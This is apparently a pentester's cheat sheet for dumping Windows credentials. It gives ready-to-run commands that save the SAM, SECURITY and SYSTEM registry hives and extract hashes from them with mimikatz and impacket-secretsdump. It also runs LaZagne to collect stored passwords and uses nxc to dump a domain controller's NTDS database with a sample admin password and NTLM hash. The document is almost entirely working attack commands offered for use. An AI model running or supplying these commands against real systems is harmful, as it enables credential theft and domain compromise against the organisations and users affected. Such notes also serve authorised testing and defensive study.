
# Dumping LSA with mimikatz
```bash
reg save hklm\sam sam.hiv
reg save hklm\security security.hiv
reg save hklm\system system.hiv
./mimikatz64.exe "privilege::debug" "token::elevate" "lsadump::sam sam.hiv security.hiv system.hiv" "exit"

./mimikatz64.exe "lsadump::sam /system:C:\TEMP\SYSTEM /sam:C:\TEMP\SAM" "exit"
./mimikatz64.exe "lsadump::sam sam.hiv security.hiv system.hiv" "exit"
```
-----------------------

# Dumping SAM with impacket
```bash
reg save hklm\sam SAM
reg save hklm\system SYSTEM

# Move both to local with smb or ftp
impacket-secretsdump -sam SAM -system SYSTEM -local
```
-----------------------

# With LaZagne

https://github.com/AlessandroZ/LaZagne
```bash
LaZagne.exe all
```
-----------------------

# Dumping NTDS with admin account
```bash
nxc smb 10.10.10.10 -u Administrator -p Voltaic1992 --ntds
nxc smb 10.10.10.10 -u Administrator -H 369def79d8372419bf6e93364cc93075 --ntds
```

